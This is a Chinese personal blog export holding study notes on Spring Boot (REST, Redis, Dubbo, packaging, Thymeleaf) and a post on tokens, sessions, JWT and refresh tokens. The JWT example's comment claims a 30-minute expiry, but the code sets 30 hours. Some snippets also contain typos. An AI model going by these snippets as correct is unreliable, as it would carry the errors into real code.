http://localhost:8080/dev/student/query/2?page=2&amp;pageSize=10\n\n\nREST即使用url表示资源，使用http动作操作资源。\n\nRESTful的注解\n@PathVariable：从url中获取数据\n@GetMapping：支持get请求方式，等同于@RequestMapping（method&#x3D;RequestMethod.GET）\n@PostMapping：支持post请求方式，等同于@RequestMapping（method&#x3D;RequestMethod.POST）\n@PutMapping：支持put请求方式，等同于@RequestMapping（method&#x3D;RequestMethod.PUT）\n@DeleteMapping：支持delete请求方式，等同于@RequestMapping（method&#x3D;RequestMethod.DELETE）\n@RestController：复合注解，是@Controller和@ResponseBody组合 在类上使用，表示当前类的所有方法都加入了@ResponseBody\n\nPostman：测试工具可以用来测试get、post、put、delete等请求。\n注意：url请求地址加请求方式 得是唯一的，否则会有歧义@GetMapping(“&#x2F;student&#x2F;{stuId}“)\n在页面中或ajax中，支持pub、delete请求在SpringMVC中，有一个过滤器，支持post请求转为put、delete\n过滤器：org.springframework.web.filter.HiddenHttpMethodFilter作用：将请求中的post请求转为put、delete\n使用步骤：\n\napplication.properties：开启使用HiddenHttpMethodMFilter过滤器\n在请求页面中，包含_method参数，他的值是put、delete，发起这个请求使用的post方式\n\n&lt;form action=&quot;student/put&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;_method&quot; value=&quot;put&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;put请求方式&quot;&gt;&lt;/form&gt;&lt;form action=&quot;student/delete&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;_method&quot; value=&quot;delete&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;delete请求方式&quot;&gt;&lt;/form&gt;\n\n第六章 SpringBoot集成RedisRedis：一个NoSQL（not only）数据库，常用作缓存使用（cache）Redis的数据类型：string、hash、set、zset、list\nRedis是一个中间件：是一个独立的服务器。Java中著名的客户端：Jedis、lettuce、Redisson\nSpring、SpringBoot中有一个RedisTemplate（StringRedisTemplate），用于处理和redis的交互\nredis的使用导入起步依赖\n&lt;!--redis起步依赖--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt;\ndata-redis使用的是 lettuce客户端库在程序中使用RedisTemplate类的方法 操作redis数据，实际就是调用的lettuce客户端中的方法\n使用示例\npackage com.example.controller;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.data.redis.core.StringRedisTemplate;import org.springframework.data.redis.core.ValueOperations;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RestController;import javax.annotation.Resource;@RestControllerpublic class RedisController &#123;    /**     * 注入RedisTemplate     *      * RedisTemplate 泛型     * RedisTemplate&lt;String,String&gt;     * RedisTemplate&lt;Object,Object&gt;     * RedisTemplate     *      * 注意：RedisTemplate对象的名称 redisTemplate     */    @Resource    private RedisTemplate redisTemplate;    @Resource    private StringRedisTemplate stringRedisTemplate;    //添加数据到redis    @PostMapping(&quot;/redis/add&quot;)    public String addToRedis(String name, String value) &#123;        //操作Redis中的String类型的数据，先获取ValueOperations对象        ValueOperations valueOperations = redisTemplate.opsForValue();        valueOperations.set(name, value);        return &quot;向redis添加String数据&quot;;    &#125;    //从redis获取数据    @GetMapping(&quot;/redis/getKey&quot;)    public String getData(String key) &#123;        ValueOperations valueOperations = redisTemplate.opsForValue();        Object value = valueOperations.get(key);        return &quot;key:&quot; + key + &quot;value:&quot; + value;    &#125;    @PostMapping(&quot;/redis/&#123;key&#125;/&#123;value&#125;&quot;)    public String addStringKV(@PathVariable String key, @PathVariable String value) &#123;        //使用StringRedisTemplate对象        stringRedisTemplate.opsForValue().set(key, value);        return &quot;使用StringRedisTemplate对象，&quot; + &quot;key:&quot; + key + &quot;value:&quot; + value;    &#125;    @PostMapping(&quot;/redis/getstr/&#123;key&#125;&quot;)    public String getStringValue(@PathVariable String key) &#123;        //使用StringRedisTemplate对象        stringRedisTemplate.opsForValue().get(key);        return &quot;使用StringRedisTemplate对象，&quot; + &quot;key:&quot; + key;    &#125;&#125;\n\nStringRedisTemplate 和 RedisTemplateStringRedisTemplate：把key、value都作为String处理，使用的是String的序列化，可读性好。RedisTemplate：把key、value经过了序列化存到redis。key、value是序列化的内容，不能直接识别。默认使用jdk的序列化，可以修改为其他的序列化。\n设置key或value的序列化方式\n/** * 设置 RedisTemplate 序列化 */public String addString(String key,String value)&#123;    //使用RedisTemplate，在存取值之前，设置序列化方式。    //设置key使用String的序列化    redisTemplate.setKeySerializer(new StringRedisSerializer());    //设置value的序列化    redisTemplate.setValueSerializer(new StringRedisSerializer());    redisTemplate.opsForValue().set(key,value);    return &quot;定义RedisTemplate对象key、value的序列化&quot;;&#125;\n\n第七章 SpringBoot集成DubboSpringBoot集成Dubbo的文档文档\n公共项目独立的maven项目：定义了接口和数据类\npublic class Student implements Serializable&#123;    private static final long serialVersionUID = 3941539077791951521L;        private Integer id;    private String name;    private Integer age;&#125;\npublic interface StudentService&#123;    Student queryStudent(Integer id);&#125;\n\n\n创建服务提供者模块，实现接口模块\n\ndubbo依赖 和 zookeeper依赖\n&lt;!--dubbo依赖--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;    &lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt;    &lt;version&gt;3.0.7&lt;/version&gt;&lt;/dependency&gt;&lt;!--zookeeper依赖--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;    &lt;artifactId&gt;dubbo-dependencies-zookeeper&lt;/artifactId&gt;    &lt;version&gt;3.0.7&lt;/version&gt;    &lt;type&gt;pom&lt;/type&gt;    &lt;exclusions&gt;        &lt;!--排除log4h依赖，因为重复--&gt;        &lt;exclusion&gt;            &lt;groupId&gt;slf4j-log4j12&lt;/groupId&gt;            &lt;artifactId&gt;org.slf4j&lt;/artifactId&gt;        &lt;/exclusion&gt;    &lt;/exclusions&gt;&lt;/dependency&gt;\n注：在pom文件中使用  标签排除包含的依赖，已解决重复引入依赖的问题\n实现接口\n/*使用dubbo中的注解暴露服务@Component可以不加 */@DubboService(interfaceClass = StudentService.class,version = &quot;1.0&quot;,timeout = 5000)public class StudentServiceImpl implements StudentService &#123;    @Override    public Student queryStudent(Integer id) &#123;        Student student = studentDao.selectById(id);        return student;    &#125;&#125;\n\n外部化配置\n#配置服务名称 dubbo:application name=&quot;名称&quot;spring.application.name=studentService-provider#配置扫描的包，扫描的@DubboServicedubbo.scan.base-packages=com.example.service#配置dubbo协议#dubbo.protocol.name=dubbo#dubbo.protocol.port=20881#注册中心dubbo.registry.address=zookeeper://localhost:2181\n\n在类上使用 @DubboService 注解来暴露服务\n在主类之上使用 @EnableDubbo 注解启用Dubbo包含了 @EnableDubboConfig 和 @DubboComponentScan\n@SpringBootApplication@EnableDubbopublic class SpringBootDemo001Application&#123;    public static void main(String[] args) &#123;        SpringApplication.run(SpringBootDemo001Application.class, args);    &#125;&#125;\n\n\n创建消费者模块\n\n添加依赖，与服务提供者相同。\n创建Controller或者Service调用远程服务\n@RestContrlollerpublic class DubboController&#123;    /*            引用远程服务，把创建好的代理对象，注入给studentService            @DubboReference(interfaceClass = StudentService.class,version = &quot;1.0&quot;)            没有使用interfaceClass，默认是 引用数据类型     */    @DubboReference(version = &quot;1.0&quot;)    private StudentService studentService;        @GetMapping(&quot;/query&quot;)    public String queryStudent(Integer id)&#123;        Student student = studentService.queryStudent(id);        return &quot;调用远程接口获取的对象：&quot;+student;    &#125;&#125;\n\n配置文件application.properties\n#指定服务名称spring.application.name=consumer-application#指定注册中心dubbo.registry.address=zookeeper://localhost:2181\n\n第八章 SpringBoot打包主类继承SpringBootServletInitializer才能使用外部的tomcatSpringBootServletInitializer相当于原有web.xml的替代使用嵌入式的tomcat，默认不支持jsp。  \n打包成war\n指定打包后的名称\n\n&lt;build&gt;    &lt;!--打包后的文件名称--&gt;    &lt;finalName&gt;bootDemo&lt;/finalName&gt;&lt;/build&gt;\n\n指定jsp编译的目录\n\n&lt;resources&gt;    &lt;resource&gt;        &lt;directory&gt;src/main/java&lt;/directory&gt;        &lt;includes&gt;            &lt;include&gt;**/*.xml&lt;/include&gt;        &lt;/includes&gt;    &lt;/resource&gt;    &lt;resource&gt;        &lt;directory&gt;src/main/resources&lt;/directory&gt;        &lt;includes&gt;            &lt;include&gt;**/*.*&lt;/include&gt;        &lt;/includes&gt;    &lt;/resource&gt;    &lt;resource&gt;        &lt;directory&gt;src/main/webapp&lt;/directory&gt;        &lt;targetPath&gt;META-INF/resources&lt;/targetPath&gt;        &lt;includes&gt;            &lt;include&gt;**/*.*&lt;/include&gt;        &lt;/includes&gt;    &lt;/resource&gt;&lt;/resources&gt;\n\n执行打包是war\n\n&lt;!--打包类型--&gt;&lt;packaging&gt;war&lt;/packaging&gt;\n\n主启动类继承SpringBootServletInitializer\n\n@SpringBootApplicationpublic class SpringBootDemo001Application extends SpringBootServletInitializer&#123;    public static void main(String[] args) &#123;        SpringApplication.run(SpringBootDemo001Application.class, args);    &#125;&#125;\n\n部署war将war文件放到tomcat等服务器的发布目录中。\n\n打包成jar\n指定打包后的名称\n\n&lt;build&gt;    &lt;!--打包后的文件名称--&gt;    &lt;finalName&gt;bootDemo&lt;/finalName&gt;&lt;/build&gt;\n\n指定springboot-maven-plugin版本\n\n&lt;plugins&gt;    &lt;plugin&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;        &lt;!--打包jar，有jsp文件时，必须指定maven-plugin插件版本是1.4.2.RELEASE--&gt;        &lt;version&gt;1.4.2.RELEASE&lt;/version&gt;    &lt;/plugin&gt;&lt;/plugins&gt;\n\n执行maven clean package 在target目录中，生成jar文件 bootDemo.jar 执行独立的springboot项目，即 java -jar bootDemo.jar\n\n第九章 Thymeleaf 模板介绍Thymeleaf是模板引擎，使用Java开发，在服务器端运行。将处理好的请求发送给浏览器。Java生态下的模板还有Freemaker、Velocity、Beetl(国产)等。非web环境下，Thymeleaf能直接显示模板上的静态数据；web环境下，能像jsp一样从后台接收数据并替换到模板上。它是基于HTML的，以HTML标签为载体。SpringBoot集成了Thymeleaf模板技术，官方也推荐使用它来代替jsp进行前端页面的数据展示。因为jsp需要编译运行，效率比较低。\nThymeleaf官网Thymeleaf官方文档\n配置依赖\n&lt;!--模板引擎起步依赖--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;&lt;/dependency&gt;\n\n一些配置\n#在开发阶段，关闭模板缓存，让修改立刻生效spring.thymeleaf.cache=false#编码格式spring.thymeleaf.encoding=UTF-8#模板的类型（默认是HTML，模板是html文件）spring.thymeleaf.mode=HTML#模板的前缀： 类路径的 classpath:/templatesspring.thymeleaf.prefix=classpath:/templates/#后缀spring.thymeleaf.suffix=.html\n\n表达式\n标准变量表达式 语法：${key} 作用：获取key对应的文本数据，key是request作用域中的key。使用request.setAttribute(),model.addAttribute() 在页面中html标签中使用 th:text&#x3D;”${key}”\n\n&lt;p&gt;获取student对象属性值&lt;/p&gt;&lt;p th:text=&quot;$&#123;student.id&#125;&quot;&gt;id&lt;/p&gt;&lt;p th:text=&quot;$&#123;student.name&#125;&quot;&gt;name&lt;/p&gt;&lt;p th:text=&quot;$&#123;student.age&#125;&quot;&gt;age&lt;/p&gt;\n\n选择变量表达式（星号变量表达式） 语法：{key} 作用：获取这个key对应的数据，{key}需要与th:object一起使用 目的是简单获取对象的属性值\n\n&lt;p&gt;使用 *&#123;&#125; 获取student对象属性值&lt;/p&gt;&lt;div th:object=&quot;$&#123;student&#125;&quot;&gt;    &lt;p th:text=&quot;*&#123;id&#125;&quot;&gt;id&lt;/p&gt;    &lt;p th:text=&quot;*&#123;name&#125;&quot;&gt;name&lt;/p&gt;    &lt;p th:text=&quot;*&#123;age&#125;&quot;&gt;age&lt;/p&gt;&lt;/div&gt;&lt;!--直接使用也可以--&gt;&lt;p th:text=&quot;*&#123;student.id&#125;&quot;&gt;id&lt;/p&gt;\n\n链接表达式 语法：@{url} 作用：表示链接\n\n&lt;h3&gt;链接绝对路径&lt;/h3&gt;&lt;a th:href=&quot;@&#123;https://baidu.com&#125;&quot;&gt;百度&lt;/a&gt;&lt;h3&gt;链接相对路径&lt;/h3&gt;&lt;a th:href=&quot;@&#123;/queryStudent&#125;&quot;&gt;相对地址，没有参数&lt;/a&gt;&lt;h3&gt;链接相对路径，使用字符串链接传递参数&lt;/h3&gt;&lt;a th:href=&quot;@&#123;&#x27;/queryStudent?id=&#x27; + $&#123;student.id&#125; &#125;&quot;&gt;相对地址，有参数。获取model中的数据&lt;/a&gt;&lt;h3&gt;传递多个参数&lt;/h3&gt;&lt;a th:href=&quot;@&#123;/queryStudent(name=&#x27;zhangsan&#x27;,id=20)&#125;&quot;&gt;传多个参数&lt;/a&gt;\n\nThymeleaf属性属性是放在html元素中的，就是html元素的属性，加入了th前缀。属性的作用不变。加上th。属性的值由模板引擎处理，在属性上可以使用变量表达式。\n&lt;form action=&quot;/queryStudent&quot; method=&quot;post&quot;&gt;&lt;/form&gt;&lt;form th:action=&quot;/queryStudent&quot; th:method=&quot;$&#123;methodAttr&#125;&quot;&gt;&lt;/form&gt;g\n\neach 循环each循环，可以循环List、Map、Array语法：在html标签中使用 th:each\n&lt;div th:each=&quot;集合循环成员，循环状态变量：$&#123;key&#125;&quot;&gt;    &lt;p th:text=&quot;$&#123;集合循环成员&#125;&quot;&gt;&lt;/p&gt;&lt;/div&gt;\n\n集合循环成员，循环状态变量：名称都是自定义的。”循环的状态变量“可以不定义，默认是”集合循环成员Stat“循环状态变量 iterStat 可以获取以下信息index：当前迭代对象的indexcount：当前迭代对象个数（第几个）size：当前迭代对象大小（总数）even&#x2F;odd：布尔值，当前循环是否是偶数&#x2F;奇数（从0开始计算）first：布尔值，当前循环是否是第一个last：布尔值，当前循环是否是最后一个\n条件判断if判断语句，条件为true，显示html标签内容，否则不显示。没有else语句语法：th:if&#x3D;”条件语句”\n&lt;p th:if=&quot;$&#123;id==1001&#125;&quot;&gt;id是1001&lt;/p&gt;&lt;!--&quot;&quot;空字符是true--&gt;&lt;p th:if=&quot;$&#123;sex&#125;&quot;&gt;空字符&lt;/p&gt;&lt;!--null是false--&gt;&lt;p th:if=&quot;$&#123;null&#125;&quot;&gt;null&lt;/p&gt;\n\n还有个与 th:unless 和 th:if 相反的行为\n判断语句 switch,caseth:switch 和 java中的switch一样语法：th:switch&#x3D;”要比较的值”,th:case&#x3D;”值”\n&lt;div th:switch=&quot;要比较的值&quot;&gt;    &lt;p th:case=&quot;值1&quot;&gt;结果1&lt;/p&gt;    &lt;p th:case=&quot;值2&quot;&gt;结果2&lt;/p&gt;    &lt;p th:case=&quot;*&quot;&gt;默认结果(default)&lt;/p&gt;&lt;/div&gt;\n注：以上case只有一句执行\n内联 inline\n内联test：在html标签外，获取表达式的值 语法：[[${key}]]\n\n&lt;div th:inline=&quot;text&quot;&gt;    &lt;p&gt;我是[[$&#123;name&#125;]]&lt;/p&gt;&lt;/div&gt;\n\n\n内联JavaScript\n\n&lt;script type=&quot;text/javascript&quot; th:inline=&quot;javascript&quot;&gt;    var name = [[$&#123;name&#125;]]    alert(name)&lt;/script&gt;\n\n字面量\n文本字面量：使用单引号括起来的字符串\n\n&lt;p th:text=&quot;&#x27;我是&#x27;+$&#123;name&#125;&quot;&gt;数据显示&lt;/p&gt;\n\n数字字面量\n\n&lt;p th:if=&quot;$&#123;20&gt;5&#125;&quot;&gt;20&gt;5&lt;/p&gt;\n\nboolean字面量\n\n&lt;p th:if=&quot;isLogin == true&quot;&gt;用户已登录&lt;/p&gt;\n\nnull字面量\n\n&lt;p th:if=&quot;student != null&quot;&gt;有student数据&lt;/p&gt;\n\n字符串链接\n使用单引号括起来的字符串，使用 + 连接其他字符串或表达式\n\n&lt;p th:text=&quot;&#x27;我是&#x27; + $&#123;name&#125;&quot;&gt;数据显示&lt;/p&gt;\n\n使用双竖线，|字符串和表达式|\n\n&lt;p th:text=&quot;|我是$&#123;name&#125;|&quot;&gt;显示数据&lt;/p&gt;\n\n运算符算数运算：+,-,*,&#x2F;关系比较：&gt;,&lt;,&gt;&#x3D;,&lt;&#x3D;(gt,lt,ge,le)相等判断：&#x3D;&#x3D;,!&#x3D;(eq,ne)\n&lt;p th:text=&quot;$&#123;age &gt; 20&#125;&quot;&gt;年龄大于20&lt;/p&gt;&lt;p th:text=&quot;$&#123;20 + 30&#125;&quot;&gt;显示运算结果&lt;/p&gt;&lt;p th:if=&quot;$&#123;student == null&#125;&quot;&gt;student是null&lt;/p&gt;&lt;p th:if=&quot;$&#123;student eq null&#125;&quot;&gt;student是null&lt;/p&gt;&lt;p th:if=&quot;$&#123;student ne null&#125;&quot;&gt;student不是null&lt;/p&gt;&lt;p th:if=&quot;$&#123;isLogin == true ? true : false&#125;&quot;&gt;&lt;/p&gt;\n\nThymeleaf基本对象模板引擎提供了内置对象，可以使用#开始引用。官方文档\n\n#request 表示 HttpServletRequest\n#session 表示 HttpSession\nsession 表示 Map对象，是#session的简单表达方式，用来获取session中指定key的值 #session.getAttribute(“loginname”)&#x3D;&#x3D;session.loginname\n\n&lt;h3&gt;内置对象#request,#session,session的使用&lt;/h3&gt;&lt;p&gt;获取作用域中的信息&lt;/p&gt;&lt;p th:text=&quot;$&#123;#requset.getAttribute(&#x27;requestData&#x27;)&#125;&quot;&gt;&lt;/p&gt;&lt;p th:text=&quot;$&#123;#session.getAttribute(&#x27;sessionData&#x27;)&#125;&quot;&gt;&lt;/p&gt;&lt;p th:text=&quot;$&#123;session.loginname&#125;&quot;&gt;&lt;/p&gt;&lt;h3&gt;使用内置对象的方法&lt;/h3&gt;&lt;p th:text=&quot;$&#123;#request.getRequestURL()&#125;&quot;&gt;&lt;/p&gt;&lt;p th:text=&quot;$&#123;#request.getRequestURI()&#125;&quot;&gt;&lt;/p&gt;&lt;p th:text=&quot;$&#123;#request.getQueryString()&#125;&quot;&gt;&lt;/p&gt;&lt;p th:text=&quot;$&#123;#request.getContextPath()&#125;&quot;&gt;&lt;/p&gt;&lt;p th:text=&quot;$&#123;#request.getServerName()&#125;&quot;&gt;&lt;/p&gt;&lt;p th:text=&quot;$&#123;#request.getServerPort()&#125;&quot;&gt;&lt;/p&gt;\n\n此外，还有很多工具类。提供string、date、集合的一些处理方法。此处不再列举，详细请查看官方文档。\n自定义模板模板是内容的复用，定义一次，在其他模板文件中多次使用。模板的使用：1.定义模板2.使用模板\n模板定义语法：\n&lt;div th:fragment=&quot;head&quot;&gt;    &lt;p&gt;hello world&lt;/p&gt;&lt;/div&gt;\n引用模板的语法：\n&lt;!--插入模板insert--&gt;&lt;div th:insert=&quot;~&#123; templatename :: selector&#125;&quot;&gt;&lt;/div&gt;&lt;!--templatename:文件名称--&gt;&lt;!--selector:自定义模板名称--&gt;&lt;div th:insert=&quot;templatename :: selector&quot;&gt;&lt;/div&gt;&lt;!--templatename:文件名称--&gt;&lt;!--selector:自定义模板名称--&gt;&lt;!--包含模板insert--&gt;&lt;div th:include=&quot;~&#123; templatename :: selector&#125;&quot;&gt;&lt;/div&gt;&lt;div th:include=&quot;templatename :: selector&quot;&gt;&lt;/div&gt;&lt;!--对于使用模板：有包含模板（th:include），插入模板（th:insert）--&gt;&lt;!--包含是替换原来的标签，插入只是插入--&gt;\n\n第十章 总结注解spring+springMVC+SpringBoot\n创建对象：@Controller：放在类上，创建控制器对象，注入到容器中。@RestController：放在类上，创建控制器对象，注入到容器中。作用：复合了@Controller合@ResponseBodey，使用这个注解，控制器方法返回值都是数据，没有视图。@Service：放在业务层实现类上，创建service对象，注入到容器。@Repository：放在dao层实现类上，创建dao对象，注入到容器。没有使用是因为dao对象是MyBatis框架通过代理生成的，不需要使用。@Component：放在类上，创建此类的对象，放入到容器中。\n赋值：@Value：简单类型的赋值。还可以使用它获取配置文件中的数据。@Autowired：引用类型赋值自动注入，支持byName，byType，默认是byType。放在属性或构造方法上，推荐放在构造方法上。@Qualifer：给引用类型赋值，使用byName。注：@Autowired，@Qualifer都是Spring框架提供的@Resource：来自jdk中的定义，javax.annotation。实现引用类型的自动注入，支持byName，byType。默认是byName，如果失败，再使用byType注入。在属性上使用\n其他：@Configuration：放在类上，表示这是个配置类，相当于xml配置文件。@Bean：放在方法上，把方法返回值对象，注入到spring容器中。@ImportResource：加载其他的xml配置文件，把文件中的对象注入到spring容器中。@PropertySource：读取其他的properties属性配置文件。@ComponentScan：扫描器，指定报名，扫描注解。@ResponseBody：放在方法上，表示方法返回值是数据，不是试视图。@RequestBody：把请求体中的方法读取出来，转为java对象使用。@ControllerAdvice：控制器增强，放在类上，表示此类提供了方法，可以对controller增强功能。@ExceptionHandler：处理异常，放在方法上。@Transcational：处理事务，放在service实现类的public方法上，表示此方法有事务。\nSpringBoot中的注解：@SpringBootApplication：放在启动类上，包含了@SpringBootConfiguration、@EnableAutoConfiguration、@ComponentScan\nMybatis相关注解：@Mapper：放在类上，让MyBatis找到接口，创建代理对象@MapperScan：放在主类上，指定扫描的包，将包中所有接口都创建代理对象。对象注入到容器中。@Param：放在dao接口的方法形参前，作为命名参数使用。\nDubbo注解：@DubboService：在提供者端使用，暴露服务，放在接口实现类上。@DubboReference：在消费者端使用，引用远程服务，放在属性上使用。@EnableDubbo：放在主类上，表示启用Dubbo功能。\n一些想法断断续续学了快一个月，springboot算是摆脱了众多的配置文件，对开发来说还是蛮友好的。关于Thymeleaf模板引擎，我感觉和jsp有点像。但我没有学习过jsp，只是浅浅的用过。模板引擎应该算不上前后端分离，不过它是在html文件的标签上增加内容，实现动态的功能，算是伪分离吧。前后端分离，人不分离。现在linux使用地还不是很熟练，后面打算细细地学习下linux的使用，因为web应用是要部署到linux服务器的，所以学习linux是必要的。后面换电脑也打算使用linux作为主操作系统，大概会选择deepin系统吧。目前要复习期末考试，考完后，会开始健康码网站的制作。后面的学习计划，大概有Nginx，Docker之类的，然后继续深入对spring系列框架的理解合使用。更远一些的，大概会去学一下vue，了解下前端，毕竟如果是一个人做网站的话，只有后端也是不太行的。好耶！可以使用springboot，告别那么多配置文件了。\n\n2022.5.29\n\n","categories":["学习笔记"],"tags":["java","SpringBoot"]},{"title":"Token机制","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Token%E6%9C%BA%E5%88%B6/","content":"Token 是什么token 是令牌，是服务器生成的一串用于标记用户的字符串。每次请求时携带，让服务器知道请求是哪个用户发出的。（有状态的请求）\nWeb 1.0早期的网站大多是展示自己的内容，以期望更多人可以看到。类似于报社，博客之类的。并不在意用户是谁。\n内容由平台创造、控制、所有，最后获利的也是平台。\nWeb 2.0后来的网站，比如现在。大部分都需要登录才能使用，网站需要知道用户是谁，以提供更加个性化的服务或者广告投放。比如电商网站、视频网站。\n内容由用户创造、但归平台控制和所有。收益也是平台所有。收益的分配权在平台手中。\nWeb 3.0大概就是区块链所畅想的世界。内容由用户创造、归用户所有、由用户控制。并和平台协议分配利益。\n更多可以参考：一文读懂”什么是 Web 3.0 ？”关于 web3 了解不深，简单介绍。可能最主要的就是内容，或者说利益的归属权。下面回过去谈 token。\n和 token 目的相似的 sessionsession 是会话。在服务端保存了用户信息，用来区分请求是属于哪个用户的。session 是基于 cookie 实现的，他会在请求后携带一个 cookie JSESSIONID。也是一个用于标记用户的字符串。浏览器每次请求都会带上 cookie。所以和 token 基本一样。那么使用 token 的意义是什么？\n\n首先不同的浏览器对 cookie 是有不同的限制的，比如数量和大小上。\n其次就是，用户信息都存储在服务端的 session 中，用户量大的话，对服务器的压力也会大起来。那么为什么 token 同样是标记用户的字符串，不会有这个问题呢？因为 token 这个字符串是将用户信息进行加密所得到的字符串。服务端并不存储。有加密就有解密，所以 token 中不要写入敏感信息。\n最后，cookie 是存在跨域等问题的。而 token 可以写在请求头、请求体，甚至是 url 路径中传给服务端。简单点说，就是使用更加自由。\n\n另外，用户信息存在 token 中，还有个优点就是在分布式系统中，不需要同步用户信息。使用 session 的分布式系统往往需要考虑 session 的共享问题。之前写过一篇 spring session 的笔记，有一些 session 共享的方案。\n当然，token 也有缺点。那就是 token 一点生成，那么久无法撤销。因为服务端是不会任何存用户信息的，所以的用户信息都由 token 解密而来。 将过期时间写入 token 基本是必须的。服务端基本也只能通过这个判断 token 是否还有效。无法说在有效期内让这个 token 无效。（至少我没想到好方法。当然，如果在服务端存个标识。再判断是否有效。那么基本也就回到 session 了。没必要使用 token。\nJWTJWT 全称 JSON Web Token。是一个开放标准(rfc7519)，它定义了一种紧凑的、自包含的方式，用于在各方之间以 JSON 对象安全地传输信息。此信息可以验证和信任，因为它是数字签名的。JWT 可以使用密钥〈使用 HMAC 算法）或使用 RSA 或 ECDSA 的公钥&#x2F;私钥对进行签名。\nJWT 生成的 token 由三部分组成：\n\n标头（Header）\n有效载荷（Payload）\n签名（Signature）\n\n更详细的介绍：深入浅出之JWT(JSON Web Token)下面是 JWT 的使用示例代码\nmaven 依赖&lt;dependency&gt;    &lt;groupId&gt;com.auth0&lt;/groupId&gt;    &lt;artifactId&gt;java-jwt&lt;/artifactId&gt;    &lt;version&gt;4.4.0&lt;/version&gt;&lt;/dependency&gt;\n\n使用public class JWTUtil &#123;        // 密钥    private String secret;        /**     * 创建 token     */        public String createToken(User user) &#123;        return JWT.create()                .withExpiresAt(Instant.ofEpochMilli(System.currentTimeMillis() + 30 * 60 * 60 * 1000))  // 设置过期时间 30分钟                .withAudience(user.getUsername()) // 设置用户信息。可以放很多，但不要放敏感信息                .sign(Algorithm.HMAC256(secret)); // 指定签名算法    &#125;    /**     * 解析 token     */    public User decodeToken(String token) &#123;        String username;        try &#123;            username = JWT.decode(token).getAudience().get(0);            JWTVerifier jwtVerifier = JWT.require(Algorithm.HMAC256(secret)).build();            jwtVerifier.verify(token);        &#125; catch (JWTDecodeException e) &#123;            e.printStackTrace();            return null;        &#125;        return new User().setUsername(username);    &#125;&#125;\n\n多设备登录与单设备登录多设备登录，将每次登录都视为一个新用户即可。给他发放新的 token。\n单设备登录，需要记录用于区分用户设备的标识。实现登出功能，并让其余设备登出即可。\n使用 token 实现单设备登录的话，有些违背它的设计。使用 session 或许会更方便。因为单纯使用 token 是没办法实现登出功能的。\n单点登录 Single Sign On（简称SSO）单点登录，指在多系统应用群中登录一个系统，便可在其他所有系统中得到授权而无需再次登录，包括单点登录与单点注销两部分。什么是单点登录（SSO）\n实现单点登录，就需要多个系统共享用户信息。用户在系统A上登录了，系统A获取到的用户信息需要同步给系统B、系统C… 以达到用户访问系统B的时候，不需要再次登录。\n使用 session 的话，就是 session 同步的问题。\n\n使用 tomcat 集群 session 全局复制。每个 tomcat 里的 session 会完全同步。比较影响性能。\n将请求的 ip 进行哈希映射到对应的机器。就是同一用户的多次请求都请求的同一个服务器。只需要简单的配置，不要用额外的中间件。但他绕过了问题，并没有解决。\n使用中间件，比如 redis 存储 session。然后多服务器共享。\n\n使用 token 的话。就不需要那么麻烦了。因为用户信息就在 token 中。\n从单点登录的功能来看，token 的设计还是很巧妙的。不用额外中间件，不是很浪费性能，系统设计上也不会特别复杂。但是单纯使用 token，没法注销。有得必有失嘛\n更多的多系统设计可能会将登录单独做成一个系统。由它进行 session 的共享，或者 token 的签发。\ntoken 的续期其实 token 没有续期，严格来说，是给一个全新的 token。\ntoken 的有效期一般比较短，在小时级别。用户的在使用的过程中，token 过期了，需要重新登陆，体验上是比较差的。所以 token 的续期也是比较需要的功能。\n在单应用中，token 续期的实现可以在 token 验证时判断下剩余时间。小于一定值（半小时、一小时…）就生成新 token 加在响应里返回。当然需要前端的配合。当然生成次数需要做限制，不然 token 泄露之后，就可以无限访问了。\n在多应用中，上述的方式也是可以的。但使用两个 token 去实现会更好一些。access_token、refresh_token。用于访问的 token 和用于刷新访问 token 的刷新 token。access_token 有效期比较短（小时级别）。refresh_token 比较长（一周或者一个月等）。access_token 每次请求都会携带。当他过期时，前端需要使用 refresh_token 去获取一个新的 access_token。\n那么，它好在哪呢。\n更加安全？一开始我不是这么认为的。因为 token 有泄露的可能性，那么不管是 access_token 还是 refresh_token 都会泄露。但是，refresh_token 中可以存储 ip、设备标识等信息。与数据库中持久化的信息进行对比。因为 refresh_token 并不会在请求中频繁携带。更加复杂的验证也是可以接受的。即使泄露出去，也可以通过额外的信息使之失效。\n另一个用处可能是在开放平台。比如微信开放平台，有非常多的第三方小程序。用户从微信打开小程序进行使用时，经过用户授权，给小程序签发 access_token 和 refresh_token。小程序服务端存放 refresh_token，小程序客户端存放 access_token。用户使用过程中，不会出现 access_token 过期的情况。短期内再次使用也不需要重新授权。微信能通过 refresh_token 知道哪个用户使用了哪个小程序。小程序能获取用户信息，同时也不会知道用户密码之类的敏感信息。\nEND这个回答很好：为什么使用双 token 的回答其实单 token 和 session 没啥区别。单系统确实是这样，多系统的话，省去了 session 同步，但也有代价。用处最大的地方，应该就是开放平台。出于对第三方客户端和链路安全的不信任而设计使用双 